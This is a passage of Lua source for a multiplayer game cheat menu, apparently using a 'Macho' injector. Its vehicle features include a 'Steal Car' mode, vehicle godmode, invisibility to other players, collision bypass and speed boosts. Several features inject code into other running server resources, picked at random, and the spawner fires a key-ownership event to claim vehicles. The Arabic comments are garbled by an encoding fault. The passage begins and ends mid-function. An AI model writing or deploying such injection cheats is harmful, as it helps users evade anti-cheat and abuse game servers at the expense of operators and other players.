    SetVehicleNeonLightEnabled(vehicle, 3, true) -- Back
    SetVehicleNeonLightsColour(vehicle, 222, 222, 255) -- Light blue color
end

-- Max Tuning Button
MachoMenuButton(oyer, "Max Tuning", function()
    local playerPed = PlayerPedId()
    
    -- Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ÙˆØ¬ÙˆØ¯ Ø§Ù„Ù„Ø§Ø¹Ø¨ ÙÙŠ Ø³ÙŠØ§Ø±Ø©
    if IsPedInAnyVehicle(playerPed, false) then
        local vehicle = GetVehiclePedIsIn(playerPed, false)
        
        -- Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ÙˆØ¬ÙˆØ¯ Ø§Ù„Ø³ÙŠØ§Ø±Ø©
        if DoesEntityExist(vehicle) then
            -- ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„ØªØ¹Ø¯ÙŠÙ„ Ø§Ù„ÙƒØ§Ù…Ù„
            MaxOut(vehicle)
            MachoMenuNotification("Max Tuning", "Vehicle fully tuned with all upgrades!")
        else
            MachoMenuNotification("Error", "Vehicle not found!")
        end
    else
        MachoMenuNotification("Error", "You must be in a vehicle to tune it!")
    end
end)


-- Ø¯Ø§Ù„Ø© Ø¥ØµÙ„Ø§Ø­ Ø§Ù„Ø³ÙŠØ§Ø±Ø© ÙƒØ§Ù…Ù„Ø©
local function cc()
    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
    if DoesEntityExist(vehicle) then
        SetVehicleFixed(vehicle)
        SetVehicleDirtLevel(vehicle, 0.0)
        SetVehicleLights(vehicle, 0)
        SetVehicleBurnout(vehicle, false)
        Citizen.InvokeNative(0x1FD09E7390A74D54, vehicle, 0)
        SetVehicleUndriveable(vehicle, false)
    end
end

-- Ø¯Ø§Ù„Ø© Ø¥ØµÙ„Ø§Ø­ Ø§Ù„Ù…Ø­Ø±Ùƒ
local function cd()
    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
    if DoesEntityExist(vehicle) then
        SetVehicleEngineHealth(vehicle, 1000)
        Citizen.InvokeNative(0x1FD09E7390A74D54, vehicle, 0)
        SetVehicleUndriveable(vehicle, false)
    end
end
-- Ø²Ø± Ø§Ù„Ù‚Ø§Ø¦Ù…Ø© Ù„Ø­Ø°Ù Ø§Ù„Ø³ÙŠØ§Ø±Ø©

-- Ø²Ø± Ø¥ØµÙ„Ø§Ø­ Ø§Ù„Ø³ÙŠØ§Ø±Ø© ÙƒØ§Ù…Ù„Ø©
MachoMenuButton(oyer, "Repair Vehicle", function()
    local playerPed = PlayerPedId()
    
    if IsPedInAnyVehicle(playerPed, false) then
        cc()
        MachoMenuNotification("Repair", "Vehicle fully repaired!")
    else
        MachoMenuNotification("Error", "You must be in a vehicle!")
    end
end)



-- Ø²Ø± Ø¥ØµÙ„Ø§Ø­ Ø§Ù„Ù…Ø­Ø±Ùƒ
MachoMenuButton(oyer, "Repair Engine", function()
    local playerPed = PlayerPedId()
    
    if IsPedInAnyVehicle(playerPed, false) then
        cd()
        MachoMenuNotification("Repair", "Engine repaired!")
    else
        MachoMenuNotification("Error", "You must be in a vehicle!")
    end
end)
MachoMenuButton(oyer, "Delete Vehicle", function()
    local playerPed = PlayerPedId()
    
    if IsPedInAnyVehicle(playerPed, false) then
        local vehicle = GetVehiclePedIsIn(playerPed, false)
        MachoInjectResource("any",[[DeleteVehicle(GetVehiclePedIsIn(PlayerPedId(), false))]])
        MachoMenuNotification("Delete", "Vehicle deleted successfully!")
    else
        MachoMenuNotification("Error", "You must be in a vehicle!")
    end
end)

-- Ù…ØªØºÙŠØ± Ù„Ø­ÙØ¸ Ø§Ù„Ù…ÙØªØ§Ø­ Ø§Ù„Ù…Ø®ØªØ§Ø±
local selectedKey = 0

-- Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„Ù…ÙØªØ§Ø­ Ø§Ù„Ù…Ø®ØµØµ
MachoMenuKeybind(oyer, "Repair Vehicle Key", 0, function(key, toggle)
    selectedKey = key
end)

-- Ù…Ø¹Ø§Ù„Ø¬ Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙØªØ§Ø­
MachoOnKeyDown(function(key)
    if key == selectedKey then
        local playerPed = PlayerPedId()
    
            if IsPedInAnyVehicle(playerPed, false) then
                cc()
                MachoMenuNotification("Repair", "Vehicle fully repaired!")
            else
                MachoMenuNotification("Error", "You must be in a vehicle!")
            end
    end
end)
local selectedKey = 0

-- Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„Ù…ÙØªØ§Ø­ Ø§Ù„Ù…Ø®ØµØµ
MachoMenuKeybind(oyer, "Repair engine Key", 0, function(key, toggle)
    selectedKey = key
end)

-- Ù…Ø¹Ø§Ù„Ø¬ Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙØªØ§Ø­
MachoOnKeyDown(function(key)
    if key == selectedKey then
        local playerPed = PlayerPedId()
    
        if IsPedInAnyVehicle(playerPed, false) then
            cd()
            MachoMenuNotification("Repair", "Engine repaired!")
        else
            MachoMenuNotification("Error", "You must be in a vehicle!")
        end
    end
end)
local selectedKey = 0

-- Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„Ù…ÙØªØ§Ø­ Ø§Ù„Ù…Ø®ØµØµ
MachoMenuKeybind(oyer, "Delete Vehicle Key", 0, function(key, toggle)
    selectedKey = key
end)

-- Ù…Ø¹Ø§Ù„Ø¬ Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙØªØ§Ø­
MachoOnKeyDown(function(key)
    if key == selectedKey then
        local playerPed = PlayerPedId() -- âœ… ØªØ­Ø¯ÙŠØ« Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù„Ø§Ø¹Ø¨ Ø¯Ø§Ø®Ù„ Ø§Ù„Ø¯Ø§Ù„Ø©
        if IsPedInAnyVehicle(playerPed, false) then
            local vehicle = GetVehiclePedIsIn(playerPed, false)
            MachoInjectResource("any",[[DeleteVehicle(GetVehiclePedIsIn(PlayerPedId(), false))]]) -- Ø­Ø°Ù Ø§Ù„Ø³ÙŠØ§Ø±Ø©
            MachoMenuNotification("Delete", "Vehicle deleted successfully!")
        else
            MachoMenuNotification("Error", "You must be in a vehicle!")
        end
    end
end)
MachoMenuCheckbox(VehicleCheck, "Steal Car", 
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            else
                MachoMenuNotification("Error", "No resources found!")
                return
            end
        end
        
        MachoInjectResource(targetResource, [[
            local playerPed = PlayerPedId()
            SetPedConfigFlag(playerPed, 342, false)
            SetPedConfigFlag(playerPed, 252, true)
            SetPedConfigFlag(playerPed, 186, true)
            SetPedConfigFlag(playerPed, 187, true)
        ]])
        
        MachoMenuNotification("Player", " Steal Car Mode enabled")
    end,
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            end
        end
        
        if targetResource then
            MachoInjectResource(targetResource, [[
                local playerPed = PlayerPedId()
                SetPedConfigFlag(playerPed, 342, true)
                SetPedConfigFlag(playerPed, 252, false)
                SetPedConfigFlag(playerPed, 186, false)
                SetPedConfigFlag(playerPed, 187, false)
            ]])
            
            MachoMenuNotification("Player", "Steal Car Mode disabled")
        end
    end
)


MachoMenuText(oyer,"Vehicle Spawn")


-- Text input for Vehicle Model
local VehicleModelInput = MachoMenuInputbox(oyer, "Vehicle Model", "e.g., sultan")

-- Variable for giving key
local GiveKey = false

-- Vehicle Creation Button (with automatic key giving)
MachoMenuButton(oyer, "Create Vehicle", function()
    local modelName = MachoMenuGetInputbox(VehicleModelInput)

    if modelName and modelName ~= "" then
        MachoInjectResource("any", string.format([[
            local modelName = "%s"
            local modelHash = GetHashKey(modelName)

            if not IsModelInCdimage(modelHash) then
                TriggerEvent('chat:addMessage', { args = { '^1Vehicle System:', 'Invalid model: %s' } })
                return
            end

            RequestModel(modelHash)
            while not HasModelLoaded(modelHash) do
                Wait(0)
            end

            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local vehicle = CreateVehicle(modelHash, coords.x, coords.y, coords.z, GetEntityHeading(ped), true, false)

            if vehicle and vehicle ~= 0 then
                SetVehicleCustomPrimaryColour(vehicle, 255, 255, 255)
                SetVehicleCustomSecondaryColour(vehicle, 255, 255, 255)
                TaskWarpPedIntoVehicle(ped, vehicle, -1)

                -- Always give key
                local plate = GetVehicleNumberPlateText(vehicle)
                TriggerEvent("vehiclekeys:client:SetOwner", plate)
                TriggerEvent('chat:addMessage', { args = { '^2Vehicle System:', 'Vehicle created and key given!' } })
            else
                TriggerEvent('chat:addMessage', { args = { '^1Vehicle System:', 'Failed to create vehicle!' } })
            end

            SetModelAsNoLongerNeeded(modelHash)
        ]], modelName, modelName))

        MachoMenuNotification("Vehicle System", "Vehicle created and key given!")
    else
        MachoMenuNotification("Error", "Enter a valid vehicle model!")
    end
end)


local antiKnockOffLoop = false

MachoMenuCheckbox(VehicleCheck, "Seat belt", 
   function()
       antiKnockOffLoop = true
       MachoMenuNotification("Seat belt", "Activated")
       
       Citizen.CreateThread(function()
           while antiKnockOffLoop do
               local playerPed = PlayerPedId()
               SetPedCanBeKnockedOffVeh(playerPed, false)
               Citizen.Wait(100)
           end
           
           -- Restore when disabled
           local playerPed = PlayerPedId()
           SetPedCanBeKnockedOffVeh(playerPed, true)
       end)
   end,
   function()
       antiKnockOffLoop = false
       MachoMenuNotification("Seat belt", "Deactivated")
   end
)


MachoMenuCheckbox(VehicleCheck, "Rainbow Vehicle Colour", 
    function()
        RainbowCar = true
        MachoMenuNotification("Rainbow Car", "Activated")
        
        Citizen.CreateThread(function()
            while RainbowCar do
                local playerPed = PlayerPedId()
                
                if IsPedInAnyVehicle(playerPed, false) then
                    local vehicle = GetVehiclePedIsIn(playerPed, false)
                    local rainbowColor = getRainbowColor()
                    
                    -- Set primary color
                    SetVehicleCustomPrimaryColour(
                        vehicle,
                        rainbowColor.r,
                        rainbowColor.g,
                        rainbowColor.b
                    )
                    
                    -- Set secondary color
                    SetVehicleCustomSecondaryColour(
                        vehicle,
                        rainbowColor.r,
                        rainbowColor.g,
                        rainbowColor.b
                    )
                end
                
                Citizen.Wait(50) -- Update every 50ms for smooth rainbow effect
            end
        end)
    end,
    function()
        RainbowCar = false
        MachoMenuNotification("Rainbow Car", "Deactivated")
    end
)


-- Horn Boost Checkbox
local HornBoost = false

MachoMenuCheckbox(VehicleCheck, "Horn Boost", 
    function()
        HornBoost = true
        MachoMenuNotification("Horn Boost", "Activated - Press E while in vehicle")
        
        Citizen.CreateThread(function()
            while HornBoost do
                if HornBoost and IsPedInAnyVehicle(PlayerPedId(), true) then
                    if IsControlPressed(1, 38) then -- E key
                        SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 80.0)
                    end
                end
                Citizen.Wait(0)
            end
        end)
    end,
    function()
        HornBoost = false
        MachoMenuNotification("Horn Boost", "Deactivated")
    end
)


-- Vehicle Bunny Hop Checkbox
local JumpMod = false

MachoMenuCheckbox(VehicleCheck, "Vehicle  Jump {SPACE}", 
    function()
        JumpMod = true
        MachoMenuNotification("Vehicle Bunny Hop", "Activated - Press SPACE to jump")
        
        Citizen.CreateThread(function()
            while JumpMod do
                if JumpMod and IsPedInAnyVehicle(PlayerPedId(), false) then
                    if IsControlJustPressed(1, 22) then -- SPACE key
                        local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0.0)
                        ApplyForceToEntity(
                            vehicle,
                            3,
                            0.0, -- X force
                            0.0, -- Y force
                            9.0, -- Z force (upward)
                            0.0, -- X offset
                            0.0, -- Y offset
                            0.0, -- Z offset
                            0.0,
                            0.0,
                            1,
                            1,
                            0.0,
                            1
                        )
                    end
                end
                Citizen.Wait(0)
            end
        end)
    end,
    function()
        JumpMod = false
        MachoMenuNotification("Vehicle Bunny Hop", "Deactivated")
    end
)
local GhostNoSideCollision = false

MachoMenuCheckbox(VehicleCheck, "Ghost Vehicle (Only Collides With Ground)", 
    function()
        GhostNoSideCollision = true
        MachoMenuNotification("Ghost Mode", "Activated - Only collides with ground")

        Citizen.CreateThread(function()
            while GhostNoSideCollision do
                local ped = PlayerPedId()
                if IsPedInAnyVehicle(ped, false) then
                    local vehicle = GetVehiclePedIsIn(ped, false)

                    -- ØªØ¹Ø·ÙŠÙ„ Ø§Ù„Ø§ØµØ·Ø¯Ø§Ù… Ù…Ø¤Ù‚ØªØ§Ù‹ Ø¨Ø§Ù„ÙƒØ§Ù…Ù„
                    SetEntityCollision(vehicle, false, false)

                    -- Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªØ¬Ù…ÙŠØ¯ Ù„Ø­Ø¸Ø© Ù„ØªØ­Ø¯ÙŠØ« Ø§Ù„ØªØ¹Ø§Ø±Ø¶
                    FreezeEntityPosition(vehicle, true)
                    FreezeEntityPosition(vehicle, false)

                    -- Ù†Ø­Ø§ÙØ¸ Ø¹Ù„Ù‰ ØªØ£Ø«ÙŠØ± Ø§Ù„Ø¬Ø§Ø°Ø¨ÙŠØ©
                    SetEntityHasGravity(vehicle, true)
                    SetVehicleOnGroundProperly(vehicle)

                    -- Ù†Ø®Ù„ÙŠ Ø§Ù„Ø³ÙŠØ§Ø±Ø© ØªÙ…Ø± Ù…Ù† ÙƒÙ„ Ø´ÙŠØ¡ØŒ Ù„ÙƒÙ† ØªØ¨Ù‚Ù‰ Ø¹Ù„Ù‰ Ø§Ù„Ø£Ø±Ø¶
                    local vehicles = GetGamePool("CVehicle")
                    for _, otherVeh in ipairs(vehicles) do
                        if otherVeh ~= vehicle then
                            SetEntityNoCollisionEntity(vehicle, otherVeh, true)
                            SetEntityNoCollisionEntity(otherVeh, vehicle, true)
                        end
                    end

                    local peds = GetGamePool("CPed")
                    for _, otherPed in ipairs(peds) do
                        local ent = GetVehiclePedIsIn(otherPed, false)
                        if ent ~= 0 and ent ~= vehicle then
                            SetEntityNoCollisionEntity(vehicle, ent, true)
                            SetEntityNoCollisionEntity(ent, vehicle, true)
                        end
                    end
                end
                Citizen.Wait(500)
            end
        end)
    end,
    function()
        GhostNoSideCollision = false
        MachoMenuNotification("Ghost Mode", "Deactivated - Collision restored")

        local ped = PlayerPedId()
        if IsPedInAnyVehicle(ped, false) then
            local vehicle = GetVehiclePedIsIn(ped, false)

            -- Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø§ØµØ·Ø¯Ø§Ù…
            SetEntityCollision(vehicle, true, true)
            FreezeEntityPosition(vehicle, true)
            FreezeEntityPosition(vehicle, false)
        end
    end
)






-- ØªØ¹Ø±ÙŠÙ Ø§Ù„Ù…ØªØºÙŠØ±
local VehGood = false

-- ØªØ´ÙŠÙƒ Ø¨ÙˆÙƒØ³ Ù…Ø§ØªØ´Ùˆ
MachoMenuCheckbox(VehicleCheck, "Vehicle Godmode", 
    function()
        VehGood = true
    end,
    function()
        VehGood = false
    end
)

-- Ø§Ù„Ù€ loop Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ (ÙŠØ´ØªØºÙ„ ÙÙŠ Ø§Ù„Ù€ main thread)
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        
        if VehGood and IsPedInAnyVehicle(PlayerPedId(-1), true) then
            SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId(-1)), true)
        end
    end
end)
local vehicleInvisibilityAlpha = 255 -- Ø§Ù„Ù‚ÙŠÙ…Ø© Ø§Ù„Ø§ÙØªØ±Ø§Ø¶ÙŠØ© (Ù…Ø±Ø¦ÙŠ Ø¨Ø§Ù„ÙƒØ§Ù…Ù„)
local vehicleInvisibilityLoop = false
local selectedVehicleKey = 0

local VehicleInvisibilitySlider = MachoMenuSlider(VehicleCheck, "Vehicle Invisibility Level", 255, 0, 255, "%", 0, function(Value)
    vehicleInvisibilityAlpha = Value
    
    -- ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„ØªØºÙŠÙŠØ± ÙÙˆØ±Ø§Ù‹ Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ø§Ø®ØªÙØ§Ø¡ Ù…ÙØ¹Ù„
    if vehicleInvisibilityLoop then
        local playerPed = PlayerPedId()
        if IsPedInAnyVehicle(playerPed, false) then
            local vehicle = GetVehiclePedIsIn(playerPed, false)
            
            -- Ù„Ù„ÙƒÙ„Ø§ÙŠÙ†Øª: Ø§Ù„ØªØ­ÙƒÙ… ÙÙŠ Ø§Ù„Ø´ÙØ§ÙÙŠØ©
            if vehicleInvisibilityAlpha == 0 then
                SetEntityVisible(vehicle, false, false)
            else
                SetEntityVisible(vehicle, true, false)
                SetEntityAlpha(vehicle, vehicleInvisibilityAlpha, false)
            end
        end
    end
end)

-- Checkbox Ù„Ù„ØªÙØ¹ÙŠÙ„/Ø§Ù„Ø¥Ù„ØºØ§Ø¡
MachoMenuCheckbox(VehicleCheck, "Vehicle Invisible",
    function()
        vehicleInvisibilityLoop = true
        local playerPed = PlayerPedId()
        if IsPedInAnyVehicle(playerPed, false) then
            MachoMenuNotification("Vehicle Invisible", "Activated - Alpha: " .. vehicleInvisibilityAlpha)
        else
            MachoMenuNotification("Vehicle Invisible", "You need to be in a vehicle!")
            vehicleInvisibilityLoop = false
            return
        end
        
        CreateThread(function()
            while vehicleInvisibilityLoop do
                local playerPed = PlayerPedId()
                
                if IsPedInAnyVehicle(playerPed, false) then
                    local vehicle = GetVehiclePedIsIn(playerPed, false)
                    
                    -- Ù„Ù„Ø¢Ø®Ø±ÙŠÙ†: Ø¥Ø®ÙØ§Ø¡ ÙƒØ§Ù…Ù„ Ø¯Ø§Ø¦Ù…Ø§Ù‹
                    SetEntityVisible(vehicle, false, false)
                    
                    -- Ù„Ù„ÙƒÙ„Ø§ÙŠÙ†Øª ÙÙ‚Ø·: Ø¬Ø¹Ù„ Ø§Ù„Ø³ÙŠØ§Ø±Ø© Ù…Ø±Ø¦ÙŠØ© Ù…Ø­Ù„ÙŠØ§Ù‹
                    SetEntityLocallyVisible(vehicle)
                    
                    -- ØªØ·Ø¨ÙŠÙ‚ Ù…Ø³ØªÙˆÙ‰ Ø§Ù„Ø´ÙØ§ÙÙŠØ© Ù„Ù„ÙƒÙ„Ø§ÙŠÙ†Øª
                    if vehicleInvisibilityAlpha == 0 then
                        SetEntityAlpha(vehicle, 0, false)
                    else
                        SetEntityAlpha(vehicle, vehicleInvisibilityAlpha, false)
                    end
                else
                    -- Ø¥Ø°Ø§ Ø®Ø±Ø¬ Ù…Ù† Ø§Ù„Ø³ÙŠØ§Ø±Ø©ØŒ Ø£ÙˆÙ‚Ù Ø§Ù„Ø§Ø®ØªÙØ§Ø¡
                    vehicleInvisibilityLoop = false
                    MachoMenuNotification("Vehicle Invisible", "Deactivated - Left vehicle")
                end
                
                Wait(0)
            end
            
            -- Ø¥Ø±Ø¬Ø§Ø¹ Ø§Ù„Ø³ÙŠØ§Ø±Ø© Ù„Ù„Ø­Ø§Ù„Ø© Ø§Ù„Ø·Ø¨ÙŠØ¹ÙŠØ© Ø¹Ù†Ø¯ Ø§Ù„Ø¥Ù„ØºØ§Ø¡
            local playerPed = PlayerPedId()
            if IsPedInAnyVehicle(playerPed, false) then
                local vehicle = GetVehiclePedIsIn(playerPed, false)
                SetEntityVisible(vehicle, true, false)
                SetEntityAlpha(vehicle, 255, false)
            end
        end)
    end,
    function()
        vehicleInvisibilityLoop = false
        MachoMenuNotification("Vehicle Invisible", "Deactivated")
        
        -- Ø¥Ø±Ø¬Ø§Ø¹ Ø§Ù„Ø³ÙŠØ§Ø±Ø© Ù„Ù„Ø­Ø§Ù„Ø© Ø§Ù„Ø·Ø¨ÙŠØ¹ÙŠØ©
        local playerPed = PlayerPedId()
        if IsPedInAnyVehicle(playerPed, false) then
            local vehicle = GetVehiclePedIsIn(playerPed, false)
            SetEntityVisible(vehicle, true, false)
            SetEntityAlpha(vehicle, 255, false)
        end
    end
)

-- Keybind Ù„Ù„Ø§Ø®ØªØµØ§Ø±
MachoMenuKeybind(VehicleCheck, "Vehicle Invisible Key", 0, function(key, toggle)
    selectedVehicleKey = key
end)

-- ÙˆØ¸ÙŠÙØ© Ø§Ù„Ø§Ø®ØªØµØ§Ø±
MachoOnKeyDown(function(key)
    if key == selectedVehicleKey and selectedVehicleKey ~= 0 then
        if not vehicleInvisibilityLoop then
            vehicleInvisibilityLoop = true
            local playerPed = PlayerPedId()
            if IsPedInAnyVehicle(playerPed, false) then
                MachoMenuNotification("Vehicle Invisible", "Activated - Alpha: " .. vehicleInvisibilityAlpha)
            else
                MachoMenuNotification("Vehicle Invisible", "You need to be in a vehicle!")
                vehicleInvisibilityLoop = false
                return
            end
            
            CreateThread(function()
                while vehicleInvisibilityLoop do
                    local playerPed = PlayerPedId()
                    
                    if IsPedInAnyVehicle(playerPed, false) then
                        local vehicle = GetVehiclePedIsIn(playerPed, false)
                        
                        -- Ù„Ù„Ø¢Ø®Ø±ÙŠÙ†: Ø¥Ø®ÙØ§Ø¡ ÙƒØ§Ù…Ù„
                        SetEntityVisible(vehicle, false, false)
                        
                        -- Ù„Ù„ÙƒÙ„Ø§ÙŠÙ†Øª: Ø¬Ø¹Ù„ Ø§Ù„Ø³ÙŠØ§Ø±Ø© Ù…Ø±Ø¦ÙŠØ© Ù…Ø­Ù„ÙŠØ§Ù‹
                        SetEntityLocallyVisible(vehicle)
                        
                        -- ØªØ·Ø¨ÙŠÙ‚ Ù…Ø³ØªÙˆÙ‰ Ø§Ù„Ø´ÙØ§ÙÙŠØ©
                        if vehicleInvisibilityAlpha == 0 then
                            SetEntityAlpha(vehicle, 0, false)
                        else
                            SetEntityAlpha(vehicle, vehicleInvisibilityAlpha, false)
                        end
                    else
                        -- Ø¥Ø°Ø§ Ø®Ø±Ø¬ Ù…Ù† Ø§Ù„Ø³ÙŠØ§Ø±Ø©ØŒ Ø£ÙˆÙ‚Ù Ø§Ù„Ø§Ø®ØªÙØ§Ø¡
                        vehicleInvisibilityLoop = false
                        MachoMenuNotification("Vehicle Invisible", "Deactivated - Left vehicle")
                    end
                    
                    Wait(0)
                end
                
                -- Ø¥Ø±Ø¬Ø§Ø¹ Ø§Ù„Ø³ÙŠØ§Ø±Ø© Ù„Ù„Ø­Ø§Ù„Ø© Ø§Ù„Ø·Ø¨ÙŠØ¹ÙŠØ© Ø¹Ù†Ø¯ Ø§Ù„Ø¥Ù„ØºØ§Ø¡
                local playerPed = PlayerPedId()
                if IsPedInAnyVehicle(playerPed, false) then
                    local vehicle = GetVehiclePedIsIn(playerPed, false)
                    SetEntityVisible(vehicle, true, false)
                    SetEntityAlpha(vehicle, 255, false)
                end
            end)
        else
            vehicleInvisibilityLoop = false
            MachoMenuNotification("Vehicle Invisible", "Deactivated")
            
            -- Ø¥Ø±Ø¬Ø§Ø¹ Ø§Ù„Ø³ÙŠØ§Ø±Ø© Ù„Ù„Ø­Ø§Ù„Ø© Ø§Ù„Ø·Ø¨ÙŠØ¹ÙŠØ©
            local playerPed = PlayerPedId()
            if IsPedInAnyVehicle(playerPed, false) then
                local vehicle = GetVehiclePedIsIn(playerPed, false)
                SetEntityVisible(vehicle, true, false)
                SetEntityAlpha(vehicle, 255, false)
            end
        end
    end
end)
local shiftBoostSpeed = 50.0 -- Ø§Ù„Ø³Ø±Ø¹Ø© Ø§Ù„Ø§ÙØªØ±Ø§Ø¶ÙŠØ© Ù„Ù„Ù€ Shift Boost
local shiftBoostActive = false
local shiftBoostLoop = false

-- Ø³Ù„Ø§ÙŠØ¯Ø± ÙˆØ§Ø­Ø¯ Ù„ØªØ­Ø¯ÙŠØ¯ Ø³Ø±Ø¹Ø© Ø§Ù„Ù€ Shift Boost
local ShiftBoostSlider = MachoMenuSlider(VehicleCheck, "Shift Boost Speed", 100, 100, 150, "km/h", 0, function(Value)
    shiftBoostSpeed = tonumber(Value)
end)

-- Checkbox Ù„ØªÙØ¹ÙŠÙ„/Ø¥Ù„ØºØ§Ø¡ ØªÙØ¹ÙŠÙ„ Ø§Ù„Ù€ Shift Boost
MachoMenuCheckbox(VehicleCheck, "Shift Boost",
    function()
        shiftBoostActive = true
        shiftBoostLoop = true
        MachoMenuNotification("Shift Boost", "Activated - Hold Shift while driving")
        
        Citizen.CreateThread(function()
            while shiftBoostLoop do
                -- Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù† Ø§Ù„Ù„Ø§Ø¹Ø¨ ÙÙŠ Ù…Ø±ÙƒØ¨Ø©
                if shiftBoostActive and IsPedInAnyVehicle(PlayerPedId(), true) then
                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                    
                    -- Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù† Ø§Ù„Ù„Ø§Ø¹Ø¨ Ù‡Ùˆ Ø§Ù„Ø³Ø§Ø¦Ù‚
                    if GetPedInVehicleSeat(vehicle, -1) == PlayerPedId() then
                        -- Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ Shift (Ù…ÙØªØ§Ø­ 21)
                        if IsControlPressed(1, 21) then -- Left Shift
                            -- Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ø³Ø±Ø¹Ø© Ø§Ù„Ø­Ø§Ù„ÙŠØ©
                            local currentSpeed = GetEntitySpeed(vehicle) * 3.6 -- ØªØ­ÙˆÙŠÙ„ Ù…Ù† m/s Ø¥Ù„Ù‰ km/h
                            local targetSpeed
                            
                            -- Ù…Ù†Ø·Ù‚ Ø§Ù„Ø³Ø±Ø¹Ø© Ø§Ù„Ø°ÙƒÙŠ
                            if currentSpeed > shiftBoostSpeed then
                                -- Ø¥Ø°Ø§ ÙƒØ§Ù†Øª Ø§Ù„Ø³ÙŠØ§Ø±Ø© Ø£Ø³Ø±Ø¹ Ù…Ù† Ù‚ÙŠÙ…Ø© Ø§Ù„Ø³Ù„Ø§ÙŠØ¯Ø±ØŒ Ù‚Ù„Ù„ Ø§Ù„Ø³Ø±Ø¹Ø© ØªØ¯Ø±ÙŠØ¬ÙŠØ§Ù‹
                                targetSpeed = currentSpeed - (currentSpeed * 0.02) -- ØªÙ‚Ù„ÙŠÙ„ ØªØ¯Ø±ÙŠØ¬ÙŠ Ø¨Ù†Ø³Ø¨Ø© 2%
                            else
                                -- Ø¥Ø°Ø§ ÙƒØ§Ù†Øª Ø§Ù„Ø³ÙŠØ§Ø±Ø© Ø£Ø¨Ø·Ø£ Ù…Ù† Ù‚ÙŠÙ…Ø© Ø§Ù„Ø³Ù„Ø§ÙŠØ¯Ø±ØŒ Ø²Ø¯ Ø§Ù„Ø³Ø±Ø¹Ø© Ø¨Ù†Ø³Ø¨Ø© 5%
                                targetSpeed = currentSpeed + (shiftBoostSpeed * 0.05)
                                
                                -- ØªØ£ÙƒØ¯ Ù…Ù† Ø¹Ø¯Ù… ØªØ¬Ø§ÙˆØ² Ø§Ù„Ø­Ø¯ Ø§Ù„Ø£Ù‚ØµÙ‰
                                if targetSpeed > shiftBoostSpeed * 1.2 then
                                    targetSpeed = shiftBoostSpeed * 1.2
                                end
                            end
                            
                            -- ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ø³Ø±Ø¹Ø© Ø§Ù„Ù…Ø­Ø³ÙˆØ¨Ø© (ØªØ­ÙˆÙŠÙ„ Ù…Ø±Ø© Ø£Ø®Ø±Ù‰ Ø¥Ù„Ù‰ m/s)
                           SetVehicleForwardSpeed(vehicle,targetSpeed / 3.6)
                        end
                    end
                end
                Citizen.Wait(0)
            end
        end)
    end,
    function()
        shiftBoostActive = false
        shiftBoostLoop = false
        MachoMenuNotification("Smart Shift Boost", "Deactivated")
    end
)
local groundMagnetActive = false
local groundMagnetLoop = false

-- Checkbox Ù„ØªÙØ¹ÙŠÙ„/Ø¥Ù„ØºØ§Ø¡ ØªÙØ¹ÙŠÙ„ Ø§Ù„Ù…ØºÙ†Ø§Ø·ÙŠØ³ Ø§Ù„Ø£Ø±Ø¶ÙŠ
MachoMenuCheckbox(VehicleCheck, "Light Ground Magnet",
    function()
        groundMagnetActive = true
        groundMagnetLoop = true
        MachoMenuNotification("Light Ground Magnet", "Activated - Gentle ground attraction")
        
        Citizen.CreateThread(function()
            while groundMagnetLoop do
                -- Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù† Ø§Ù„Ù„Ø§Ø¹Ø¨ ÙÙŠ Ù…Ø±ÙƒØ¨Ø©
                if groundMagnetActive and IsPedInAnyVehicle(PlayerPedId(), true) then
                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                    
